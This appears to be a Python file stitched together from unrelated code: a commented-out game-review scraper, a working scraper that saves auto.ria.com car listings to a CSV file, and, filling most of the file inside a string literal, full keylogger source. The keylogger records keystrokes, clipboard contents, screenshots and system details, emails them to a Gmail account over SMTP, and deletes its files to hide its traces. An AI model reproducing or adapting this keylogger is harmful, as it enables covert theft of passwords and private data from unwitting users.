"""max_pages = 6
pages = []

for page in range(1, max_pages + 1):
    pages.append(requests.get('https://stopgame.ru/review/new/stopchoice/1' + str(page)))
for state in pages:
    html = BS(state.content, 'html.parser')
    for el in html.select('.lent-block'):
        title = el.select('.lent-title > a')
        print(title[0].text)
"""
import requests
from bs4 import BeautifulSoup as BS
import csv
import os

URL = 'https://auto.ria.com/newauto/marka-jeep/'
HEADERS = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                         'Chrome/80.0.3987.122 Safari/537.36', 'accept': '*/*'}
HOST = 'https://auto.ria.com'
FILE = 'cars.csv'


def get_html(url, params=None):
    r = requests.get(url, headers=HEADERS, params=params)
    return r


def get_pages_count(html):
    soup = BS(html, 'html.parser')
    pagination = soup.find_all('span', class_='mhide')
    if pagination:
        return int(pagination[-1].get_text())
    else:
        return 1


def get_content(html):
    soup = BS(html, 'html.parser')
    items = soup.find_all('div', class_='proposition')
    # print(items)
    cars = []

    for item in items:
        ua_price = item.find('span', class_='grey size13')
        if ua_price:
            ua_price = ua_price.get_text()
        else:
            ua_price = 'Цену уточняйте'

        cars.append({
            'title': item.find('div', class_='proposition_title').get_text(strip=True),
            'link': HOST + item.find('a').get('href'),
            'usd-price': item.find('span', class_='green').get_text(),
            'ua-price': ua_price,
            'location': item.find('svg', class_='svg svg-i16_pin').find_next('strong').get_text(),
        })
    return cars


def save_file(items, path):
    with open(path, 'w', newline='') as file:
        writer = csv.writer(file, delimiter=';')
        writer.writerow(['Марка', 'Ссылка', 'Цена(us)', 'Цена(ua)', 'Город'])
        for item in items:
            writer.writerow([item['title'], item['link'], item['usd-price'], item['ua-price'], item['location']])


def parse():
    URL = input('Введите URL: ')
    URL = URL.strip()
    html = get_html(URL)
    if html.status_code == 200:
        cars = []
        pages_count = get_pages_count(html.text)
        for page in range(1, pages_count + 1):
            print(f'Парсинг страницы {page} из {pages_count}...')
            html = get_html(URL, params={'page': page})
            cars.extend(get_content(html.text))
        save_file(cars, FILE)
        #print(cars)
        print(f'Получено {len(cars)} авто')
        os.startfile(FILE)
        # cars = get_content(html.text)
    else:
        print('Error')


parse()
'''import os
import platform
import smtplib
import socket
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import pyscreenshot as ImageGrab
import win32clipboard
from pynput.keyboard import Key, Listener
import PIL

# Start up instances of files and paths

system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"
extend = "\\"

file_path = " "  # "C:\\Users\\Public\\Roaming"

# Time Controls
time_iteration = 15  # 7200 # 2 hours
number_of_iterations_end = 2  # 5000
microphone_time = 10  # 600 is 10 minutes

# Email Controls
email_address = " "
password = " "


#######################################################

# Send to email
def send_email(filename, attachment):
    # Source code from geeksforgeeks.org

    fromaddr = email_address
    toaddr = email_address

    # instance of MIMEMultipart
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = fromaddr

    # storing the receivers email address
    msg['To'] = toaddr

    # storing the subject
    msg['Subject'] = "Log File"

    # string to store the body of the mail
    body = "Body_of_the_mail"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = filename
    attachment = open(attachment, "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()

    # Authentication
    s.login(fromaddr, password)

    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    # terminating the session
    s.quit()


# Get Computer and Network Information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPAddr + "\n")


computer_information()
send_email(system_information, file_path + extend + system_information)


# Gather clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied.")


# Screenshot functionalities
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


# Time controls for keylogger
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    counter = 0


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        # Send keylogger contents to email
        send_email(keys_information, file_path + extend + keys_information)
        # Clear contens of keylogger log file.
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
        # Take a screenshot and send to email
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information)
        # Gather clipboard contents and send to email
        copy_clipboard()
        send_email(clipboard_information, file_path + extend + clipboard_information)

        # Increase iteration by 1
        number_of_iterations += 1
        # Update current time
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

time.sleep(120)  # Sleep two minutes before we delete all files

# Delete files - clean up our tracks
delete_files = [system_information, audio_information, clipboard_information, screenshot_information, keys_information]
for file in delete_files:
    os.remove(file_path + extend + file)
'''
